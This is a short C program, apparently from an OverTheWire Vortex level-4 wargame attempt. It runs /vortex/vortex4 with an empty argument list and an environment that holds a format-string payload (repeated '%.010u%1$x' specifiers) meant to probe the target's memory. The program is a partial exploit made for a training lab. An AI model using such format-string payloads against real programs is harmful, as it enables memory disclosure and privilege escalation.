#include <stdlib.h>

char *newargs[] = { NULL };
char *newenv[] = { 
    "AAAA \%x", 
    "AAAB \%x", 
    "AAAAAAAAAAAAAAAA%.010u%1$x%.010u%1$x%.010u%1$x%.010u%1$x",
    "AAAD \%x"
};

int main() {
    execvpe("/vortex/vortex4", newargs, newenv);
}
